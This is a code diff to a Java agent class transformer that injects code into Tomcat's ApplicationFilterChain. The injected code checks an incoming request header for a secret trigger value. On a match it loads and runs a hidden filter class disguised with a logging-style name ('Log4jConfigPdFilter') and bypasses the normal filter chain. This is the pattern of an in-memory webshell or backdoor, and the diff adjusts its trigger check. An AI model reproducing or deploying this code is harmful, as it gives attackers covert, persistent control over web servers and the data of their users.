@@ -31,23 +31,23 @@ public class MyTransformer implements ClassFileTransformer {
                             "    Object reqObj = $1;" +
                             "    Object resObj = $2;" +
                             "    try {" +
-                            "            java.lang.reflect.Method getHeader = reqObj.getClass().getMethod(\"getHeader\", new Class[]{ java.lang.String.class });" +
-                            "            String ua = (String)getHeader.invoke(reqObj, new Object[]{ \""+AgentMainTest.HEADER_PARAM+"\" });" +
-                            "            if (ua != null && \""+AgentMainTest.HEADER_PARAM_VALUE+"\".toLowerCase().contains(ua.toLowerCase())) {" +
-                            "                try {" +
-                            "                    ClassLoader cl = Thread.currentThread().getContextClassLoader();" +
-                            "                    if (cl == null) cl = this.getClass().getClassLoader();" +
-                            "                    System.out.println(\"[Agent] ApplicationFilterChain#cl = \" + cl);" +
-                            "                    Class filterClass = Class.forName(\"com.filter.Log4jConfigPdFilter\", true, cl);" +
-                            "                    java.lang.reflect.Method m = filterClass.getMethod(\"getInstance\", new Class[]{ java.lang.ClassLoader.class });" +
-                            "                    Object obj = m.invoke(null, new Object[]{ cl });" +
-                            "                    java.lang.reflect.Method exec = filterClass.getMethod(\"execute\", new Class[]{ Object.class, Object.class });" +
-                            "                    exec.invoke(obj, new Object[]{ reqObj, resObj });" +
-                            "                } catch (Throwable t) {" +
-                            "                    System.out.println(\"[Agent] ApplicationFilterChain exception!!!\");" +
-                            "                    t.printStackTrace();" +
-                            "                }" +
-                            "                return;" +
+                            "        java.lang.reflect.Method getHeader = reqObj.getClass().getMethod(\"getHeader\", new Class[]{ java.lang.String.class });" +
+                            "        String ua = (String)getHeader.invoke(reqObj, new Object[]{ \"" + AgentMainTest.HEADER_PARAM + "\" });" +
+                            "        if (ua != null && ua.toLowerCase().contains(\"" + AgentMainTest.HEADER_PARAM_VALUE.toLowerCase() + "\")) {" +
+                            "            try {" +
+                            "                ClassLoader cl = Thread.currentThread().getContextClassLoader();" +
+                            "                if (cl == null) cl = this.getClass().getClassLoader();" +
+                            "                System.out.println(\"[Agent] ApplicationFilterChain#cl = \" + cl);" +
+                            "                Class filterClass = Class.forName(\"com.filter.Log4jConfigPdFilter\", true, cl);" +
+                            "                java.lang.reflect.Method m = filterClass.getMethod(\"getInstance\", new Class[]{ java.lang.ClassLoader.class });" +
+                            "                Object obj = m.invoke(null, new Object[]{ cl });" +
+                            "                java.lang.reflect.Method exec = filterClass.getMethod(\"execute\", new Class[]{ Object.class, Object.class });" +
+                            "                exec.invoke(obj, new Object[]{ reqObj, resObj });" +
+                            "            } catch (Throwable t) {" +
+                            "                System.out.println(\"[Agent] ApplicationFilterChain exception!!!\");" +
+                            "                t.printStackTrace();" +
+                            "            }" +
+                            "            return;" +
                             "        }" +
                             "    } catch (Throwable e) { e.printStackTrace(); }" +
                             "}"
